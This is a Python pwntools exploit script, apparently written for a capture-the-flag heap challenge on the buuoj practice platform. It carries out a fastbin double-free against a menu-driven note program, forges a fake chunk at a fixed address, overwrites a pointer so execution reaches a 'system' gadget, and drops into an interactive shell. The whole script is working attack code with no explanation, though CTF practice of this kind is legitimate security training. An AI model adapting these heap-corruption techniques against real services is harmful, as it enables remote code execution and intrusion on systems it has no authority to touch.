from pwn import  *
from LibcSearcher import LibcSearcher
from argparse import ArgumentParser, ArgumentDefaultsHelpFormatter

s = lambda data: p.send(str(data))
sa = lambda delim,data: p.sendafter(delim,str(data))
sl = lambda data: p.sendline(str(data))
sla = lambda delim,data: p.sendlineafter(delim,str(data))
r = lambda num=4096: p.recv(num)
ru = lambda delims,drop=True: p.recvuntil(delims,drop)
uu64 = lambda data: u64(data.ljust(8,'\0'))
leak = lambda name,addr: log.success('{} = {:#x}'.format(name, addr))

def leak_libc(func,addr,elf=None):
	if elf:
		libc = elf
		base = addr-libc.sym[func]
		leak('base',base)
		system = base+libc.sym['system']
	else:
		libc = LibcSearcher(func,addr)
		base = addr-libc.dump(func)
		leak('base',base)
		system = base+libc.dump('system')

	return (base,libc,system)

parser = ArgumentParser(formatter_class=ArgumentDefaultsHelpFormatter)
parser.add_argument('-b',help='binary file',required=True,metavar='BINARY')
parser.add_argument('-r',help='remote host',default='node3.buuoj.cn',metavar='RHOST')
parser.add_argument('-p',type=int,help='remote port',metavar='RPORT')
parser.add_argument('-l',help='libc - [xx] for v2.xx, or [/path/to/libc.so.6] to load a specific libc',default='23',metavar='LIBC')
parser.add_argument('-d',help='disable DEBUG mode',action='store_true')
parser.add_argument('-x86',help='use i386 arch',action='store_true')
args = parser.parse_args()
print(args)

binary = args.b
context.binary = binary
elf = ELF(binary,checksec=False)
if not args.d:
	context.log_level = 'DEBUG'

path_dict = {
	'23': '/lib/i386-linux-gnu/libc.so.6',
	'27': './glibc-all-in-one/libs/2.27-3ubuntu1_i386/libc-2.27.so',
	'29': './glibc-all-in-one/libs/2.29-0ubuntu2_i386/libc-2.29.so'
} if args.x86 else {
	'23': '/lib/x86_64-linux-gnu/libc.so.6',
	'27': './glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so',
	'29': './glibc-all-in-one/libs/2.29-0ubuntu2_amd64/libc-2.29.so'
}
libc_path = path_dict.get(args.l, args.l)
libc = ELF(libc_path,checksec=False)
if args.p:
	p = remote(args.r, args.p)
else:
	p = process(binary,env={'LD_PRELOAD':libc_path})

def dbg():
	gdb.attach(p)
	pause()

_add,_free,_edit,_show = 1,3,2,4
def add(index,content='a'*8):
	sla(':',_add)
	sla(':',index)
	sla(':',content)

def free(index):
	sla(':',_free)
	sla(':',index)

def edit(index,content):
	sla(':',_edit)
	sla(':',index)
	sla(':',content)

def show(index):
	sla(':',_show)
	sla(':',index)

# start
add(0)
add(1)
free(0)
free(1)
free(0)
fake = 0x602060
fake_next = 0x602150
add(2,p64(fake-0x23))
add(3)
add(4)

payload = flat('a'*3,0,0x101,fake,0,fake,0,fake_next,0,0)
add(5, payload)
edit(4,flat(0,0x21,0,0,0,0x21))

free(0) # 0x100
edit(2,'') # \x00, malloc_hook-0x10
system = 0x4008e3
edit(0,'a'*0x10+p64(system))

sla(':',_add)
sla(':',3)
# end

p.interactive()